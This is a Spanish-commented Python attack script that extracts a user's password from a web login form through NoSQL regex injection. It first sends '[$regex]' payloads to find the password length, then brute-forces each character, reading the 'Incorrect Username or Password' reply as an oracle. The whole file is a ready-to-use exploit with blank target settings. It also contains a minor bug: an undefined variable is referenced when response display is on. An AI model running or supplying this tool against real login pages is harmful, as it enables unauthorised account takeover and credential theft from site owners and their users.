# -*- coding: utf-8 -*-

import string
import requests

########################################################################

'''
	Parametros de configuracion
'''
# URL del servidor web con puerto
URL = ""

# Nombre del usuario a sacar el password.
USER = ""

# Nombre de campo de usuario
USER_PARAM_NAME = ""

# Nombre de campo de password
PASS_PARAM_NAME = ""

# Otros campos a incluir
OTHER_VALUES = "&login=Login"

# Tipo de validación
EXPR_NOSQL = "[$regex]"

# Texto que devolución que indica que es incorrecto
TEXT_NOT_VALID = "Incorrect Username or Password"

# Mostrar respuesta de servidor
SHOW_RESPONSE = False

# Caracteres a excluir
CHARS_EXCLUDE = ['*','+','.','?','|']

# Cabeceras a añadir
headers = {
		'Content-Type': 'application/x-www-form-urlencoded',
		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'
		# 'Referer': 'http://x.x.x.x/'
	}

########################################################################

def is_valid(payload):
	res = requests.post(URL, verify=False, headers=headers, allow_redirects=True, data=payload)	
	return TEXT_NOT_VALID in res.text

def get_size_pass():
	size = 1
	while True:
		print("Probando con tamaño: {size}".format(size=size))
		payload = "{}={}&{}{}=.{}{}".format(USER_PARAM_NAME, USER, PASS_PARAM_NAME, EXPR_NOSQL, "{" + str(size)+ "}", OTHER_VALUES)
		if is_valid(payload):
			return size-1
		else:
			size+=1

def get_pass(size):
	password = ""
	i = 0
	while i < size:
		for char_test in string.printable:
			if char_test not in CHARS_EXCLUDE:
				payload = "{}={}&{}{}=^{}{}{}".format(USER_PARAM_NAME, USER, PASS_PARAM_NAME, EXPR_NOSQL, password, char_test, OTHER_VALUES)

				if SHOW_RESPONSE:
					print(res.text)

				if not is_valid(payload):
					password += char_test
					print("Password[{}]: {}".format(i, password))
					i +=1
					break
	return password
			
def main():	
	size = get_size_pass()
	print("\n+------------------------+")
	print("| Tamaño de password: " + str(size) + " |")
	print("+------------------------+\n\n")
	password = get_pass(size)
	print(" [*] Password encontrada: '{}'. ".format(password))

main()
